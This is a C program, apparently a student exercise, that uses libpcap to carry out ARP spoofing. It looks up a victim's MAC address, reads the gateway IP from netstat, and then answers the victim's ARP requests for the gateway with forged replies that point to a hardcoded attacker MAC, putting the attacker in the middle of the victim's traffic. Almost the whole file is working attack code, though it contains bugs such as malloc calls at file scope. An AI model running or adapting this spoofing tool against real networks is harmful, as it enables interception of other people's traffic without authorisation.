#include <sys/time.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <pcap/pcap.h>
#include <sys/socket.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#define PROMISCUOUS 1
#define NONPROMISCUOUS 0
#define TCPHEADERSIZE 6*4

unsigned char* sender_ip = (unsigned char*)malloc( sizeof(char)*4);
unsigned char* sender_mac = (unsigned char*)malloc( sizeof(char)*6);
unsigned char* gw_IP = (unsigned char*)malloc( sizeof(char)*4);
unsigned char* h_dest = (unsigned char*)malloc( sizeof(char)*6);
unsigned char* h_source = (unsigned char*)malloc( sizeof(char)*6);
unsigned char* ar_sha = (unsigned char*)malloc( sizeof(char)*6);       //sender mac
unsigned char* ar_sip = (unsigned char*)malloc( sizeof(char)*4);       //sender IP
unsigned char* ar_tha = (unsigned char*)malloc( sizeof(char)*6);       //Target mac (my)
unsigned char* ar_tip = (unsigned char*)malloc( sizeof(char)*4);

int flag=0;
struct ip *iph;
struct tcphdr *tcph;
struct eth_hdr{
        unsigned char h_dest[6];        //destination ether addr
        unsigned char h_source[6];      //source ether addr
        unsigned short h_proto;         //packet type id filed
} __attribute__((packed));

struct arp_hdr{
        unsigned short ar_hrd;          //hardware type : ethernet
        unsigned short ar_pro;          //protocol      : ip
        unsigned char  ar_hln;          //hardware size
        unsigned char  ar_pln;          //protocal size
        unsigned short ar_op;           //opcode request or reply
        unsigned char  ar_sha[6];       //sender mac
        unsigned char  ar_sip[4];       //sender IP
        unsigned char  ar_tha[6];       //Target mac (my)
        unsigned char  ar_tip[4];       //Target IP  (my)
} __attribute__((packed));

static unsigned char g_buf[sizeof(struct eth_hdr)+sizeof(struct arp_hdr)];
// packet sum size
static int g_sock;


void endian_chnge(unsigned char* a,unsigned char* b, int c)
{
    for(int i=0; i<c; i++)
    {
      *(a+i)=*(b+i);
    }

}

int gw_IP_Parsing (const unsigned char * gw_IP) {
    unsigned char pipe_buf[1024];
    unsigned char netstat_gw_IP[16];
    int arp_pipe[2];
    pid_t pid;
    int i = 0;
    if (pipe(arp_pipe) == -1){
        printf("error : Cannot create pipe\n");
        return -1;
    }
    pid = fork();
    if (pid == 0) {             // if process is child process
        dup2(arp_pipe[1], 1);   // copy pipe for write to stdout
        close(arp_pipe[0]);     // close for-read fd
        close(arp_pipe[1]);
        system("netstat -n -r | grep UG | grep ens33 | awk '{print $2}'");
    }
    else {

        close(arp_pipe[1]);     // close for-write fd

        read(arp_pipe[0], pipe_buf, 1023);

        printf("gateway IP : %s", (const char*)pipe_buf);
        inet_aton((const char*)pipe_buf, (in_addr*)gw_IP);
    }
    return 0;

}

void send_arp_packet(pcap_t* pcd, int a)
{
    struct eth_hdr ether;
    struct arp_hdr arp;

    for(int i=0; i<6; i++)
    {
        ether.h_dest[i]=*(h_dest+i);
        ether.h_source[i]=*(h_source+i);
        arp.ar_sha[i]=*(ar_sha+i);
        arp.ar_tha[i]=*(ar_tha+i);
    }
    ether.h_proto = htons(0x0806);  //htons -> host endian change

    arp.ar_hrd = htons(0x0001);
    arp.ar_pro = htons(0x0800);
    arp.ar_hln = 0x06;
    arp.ar_pln = 0x04;
    arp.ar_op  = htons(0x0000+a);
    endian_chnge(arp.ar_sip,ar_sip,4);
    endian_chnge(arp.ar_tip,ar_tip,4);

    memcpy( g_buf,    &ether, sizeof(struct eth_hdr) );
    memcpy( g_buf+14, &arp,   sizeof(struct arp_hdr ) );

    pcap_inject(pcd,(const void*)g_buf,sizeof(g_buf));
    printf("sending\n");

    for(int i=0; i<42;i++)
    {
        //printf("%2x ",*(g_buf+i));
        if(i%4==3)
        {
            //printf("\n");
        }
    }
}

void arp(u_char *useless, const struct pcap_pkthdr *pkthdr,
                const u_char *packet)
{
    //
   // printf("start!! -- ");
   // printf("%2x:%2x:%2x:%2x:%2x:%2x\n",*(packet+22),*(packet+23),*(packet+24),*(packet+25),*(packet+26),*(packet+27));
   // printf("%2x:%2x:%2x:%2x:%2x:%2x\n",*(sender_mac),*(sender_mac+1),*(sender_mac+2),*(sender_mac+3),*(sender_mac+4),*(sender_mac+5));
    if(*(packet+12)==0x08 && *(packet+13)==0x06 && 
        !strncmp((const char*)(packet+22),(const char*)sender_mac,6) &&
        !strncmp((const char*)(packet+28),(const char*)sender_ip,4)  &&
        !strncmp((const char*)(packet+38),(const char*)gw_IP,4))
    {
        flag=1;
        printf(" detected he pingd his gateway\n");
    }
   
}

void receive_mac(u_char *useless, const struct pcap_pkthdr *pkthdr,
                const u_char *packet)
{
    if(*(packet+12)==0x08 && *(packet+13)==0x06)
    {
        printf("%2x\n",*(packet+21));
        printf("%d.%d.%d.%d\n",*(packet+38),*(packet+39),*(packet+40),*(packet+41));
    }
    if(*(packet+12)==0x08 && *(packet+13)==0x06 && !strncmp((const char*)(packet+38),(const char*)ar_sip,4)&& *(packet+21)==2&&!strncmp((const char*)(packet+28),(const char*)sender_ip,4))   
    {
        
        flag=1;
        for(int i=0; i<=5; i++)
        {
            sender_mac[i]=*(packet+22+i);
        }
        printf("%2x:%2x:%2x:%2x:%2x:%2x\n",*(sender_mac),*(packet+23),*(packet+24),*(packet+25),*(packet+26),*(packet+27));

    }
}

void arp_proofing()
{
    char *dev;
    char *net;
    char *mask;

    bpf_u_int32 netp;
    bpf_u_int32 maskp;
    char errbuf[PCAP_ERRBUF_SIZE];
    int ret;
    struct pcap_pkthdr hdr;
    struct in_addr net_addr, mask_addr;

    struct bpf_program fp;

    pcap_t *pcd; 
    dev = pcap_lookupdev(errbuf);
    printf("DEV : %s\n", dev); 
    ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
    net_addr.s_addr = netp;
    net = inet_ntoa(net_addr);
    printf("NET : %s\n", net);
    mask_addr.s_addr = maskp;
    mask = inet_ntoa(mask_addr);
    printf("MSK : %s\n", mask);
    printf("=======================\n");
    pcd = pcap_open_live(dev, BUFSIZ,  NONPROMISCUOUS, -1, errbuf);
    flag=0;
    while(1){
        pcap_loop(pcd, 1, arp, NULL);
        if(flag==1)
        {
            for(int i=0; i<=5;i++)
            {
                h_dest[i]=*(sender_mac+i);
            }
            h_source[0] = 0x00;
            h_source[1] = 0x0c;
            h_source[2] = 0x29;
            h_source[3] = 0xae;
            h_source[4] = 0x76;
            h_source[5] = 0x4a;
            ar_sha[0] = 0x00;
            ar_sha[1] = 0x0c;
            ar_sha[2] = 0x29;
            ar_sha[3] = 0xae;
            ar_sha[4] = 0x76;
            ar_sha[5] = 0x4a;
            for(int i=0; i<=3;i++)
            {
                ar_sip[i]=*(gw_IP+i);
            } 
            for(int i=0; i<=5;i++)
            {
                 ar_tha[i]=*(sender_mac+i);
            }
            strncpy((char*)ar_tip,(char*)sender_ip,4);
            send_arp_packet(pcd,2);
            send_arp_packet(pcd,2);
            send_arp_packet(pcd,2);
            flag=0;
        }
    }
    pcap_close(pcd);
}

void having_sender_mac(unsigned char* sender_ip)
{
    h_dest[0]=0xff;
    h_dest[1]=0xff;
    h_dest[2]=0xff;
    h_dest[3]=0xff;
    h_dest[4]=0xff;
    h_dest[5]=0xff;
    h_source[0] = 0x00;
    h_source[1] = 0x0c;
    h_source[2] = 0x29;
    h_source[3] = 0xae;
    h_source[4] = 0x76;
    h_source[5] = 0x4a;
    ar_sha[0] = 0x00;
    ar_sha[1] = 0x0c;
    ar_sha[2] = 0x29;
    ar_sha[3] = 0xae;
    ar_sha[4] = 0x76;
    ar_sha[5] = 0x4a;
    inet_aton("192.168.32.37",(in_addr*)ar_sip); 
    ar_tha[0] = 0x00;
    ar_tha[1] = 0x00;
    ar_tha[2] = 0x00;
    ar_tha[3] = 0x00;
    ar_tha[4] = 0x00;
    ar_tha[5] = 0x00;   //Target mac (my)
    strncpy((char*)ar_tip,(char*)sender_ip,4);

    char *dev;
    char *net;
    char *mask;
    const u_char *packet;

    bpf_u_int32 netp;
    bpf_u_int32 maskp;
    char errbuf[PCAP_ERRBUF_SIZE];
    int ret;
    struct pcap_pkthdr hdr;
    struct in_addr net_addr, mask_addr;

    struct bpf_program fp;

    pcap_t *pcd; 
    dev = pcap_lookupdev(errbuf);
    ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
    net_addr.s_addr = netp;
    net = inet_ntoa(net_addr);
    mask_addr.s_addr = maskp;
    mask = inet_ntoa(mask_addr);
    pcd = pcap_open_live(dev, BUFSIZ,  NONPROMISCUOUS, -1, errbuf);

    send_arp_packet(pcd, 1);
    
    while(flag==0)
    {
        pcap_loop(pcd, 1, receive_mac, NULL);
    }
    pcap_close(pcd);
}

int main(int argc, char **argv)
{
    inet_aton(argv[1],(in_addr*)sender_ip); 
    if(sender_ip[0]!=192||sender_ip[1]!=168||sender_ip[2]!=32)
    {
        printf("there are not in same gateway");
    }
    having_sender_mac(sender_ip);
    gw_IP_Parsing(gw_IP);
    arp_proofing();
    return 0;
}